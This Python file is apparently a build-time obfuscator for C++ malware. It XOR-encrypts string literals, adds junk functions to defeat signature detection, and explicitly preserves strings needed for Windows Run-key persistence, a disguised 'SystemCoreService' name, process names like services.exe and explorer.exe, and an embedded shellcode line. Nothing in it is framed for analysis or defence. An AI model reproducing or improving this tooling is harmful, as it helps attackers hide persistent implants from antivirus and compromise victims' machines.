import re
import random
import string

def get_random_string(length=8):
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def obfuscate_strings(code):
    decoder_functions = []
    string_literal_regex = re.compile(r'(L)?"((?:[^"\\]|\\.)*)"')
    string_map = {}

    # Exclude critical strings from obfuscation to ensure persistence works
    excluded_strings = [
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "SystemCoreService",
        "APPDATA",
        "\\\\services.exe",
        "explorer.exe",
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    ]

    def replacer(match):
        is_wide_char = match.group(1)
        original_string = match.group(2)

        # Skip obfuscation for excluded strings
        if original_string in excluded_strings:
            return match.group(0)

        last_newline = code.rfind('\n', 0, match.start())
        line_start = last_newline + 1 if last_newline != -1 else 0
        line = code[line_start:match.start()]
        stripped_line = line.strip()

        # Skip obfuscation for preprocessor directives and the shellcode line
        if stripped_line.startswith('#') or 'std::string en_sh' in stripped_line:
            return match.group(0)

        if original_string in string_map:
            return string_map[original_string] + "()"

        if len(original_string) < 2 or is_wide_char:
            return match.group(0)

        var_name = "enc_str_" + get_random_string(5)
        function_name = "get_" + var_name

        key = random.randint(1, 255)
        encrypted_chars = [ord(c) ^ key for c in original_string]

        cpp_array = f"unsigned char {var_name}[] = {{ {', '.join(map(str, encrypted_chars))}, 0 }};"

        decoder_function = f"""
const char* {function_name}() {{
    static {cpp_array}
    static bool decrypted = false;
    if (!decrypted) {{
        for (unsigned int i = 0; i < sizeof({var_name}) - 1; i++) {{
            {var_name}[i] ^= {key};
        }}
        decrypted = true;
    }}
    return (const char*){var_name};
}}
"""
        decoder_functions.append(decoder_function)
        string_map[original_string] = function_name
        return function_name + "()"

    obfuscated_code = string_literal_regex.sub(replacer, code)
    all_decoders = "\n\n" + "\n".join(decoder_functions)

    return obfuscated_code, all_decoders

def add_junk_code(code):
    junk_functions = []
    num_junk_functions = random.randint(3, 5)
    for _ in range(num_junk_functions):
        func_name = "junk_func_" + get_random_string(6)
        ret_type = random.choice(["void", "int", "bool"])
        param = "int " + get_random_string(3)

        junk_var = get_random_string(4)
        junk_op = random.choice(["+", "-", "*", "/"])
        junk_val1 = random.randint(1, 100)
        junk_val2 = random.randint(1, 100)

        func_body = f"int {junk_var} = {junk_val1} {junk_op} {junk_val2 if junk_op != '/' or junk_val2 != 0 else 1};"
        if ret_type == "int":
            func_body += f" return {junk_var};"
        elif ret_type == "bool":
            func_body += f" return {junk_var} > 0;"

        junk_functions.append(f"{ret_type} {func_name}({param}) {{{func_body}}}")

    return "\n".join(junk_functions) + "\n\n" + code

def run_obfuscation(input_file, output_file):
    with open(input_file, "r") as f:
        code = f.read()

    code = add_junk_code(code)
    code, string_decoder = obfuscate_strings(code)

    # Replace the placeholder with the decoder functions
    code = code.replace("// {decoder_functions_placeholder}", string_decoder)

    with open(output_file, "w") as f:
        f.write(code)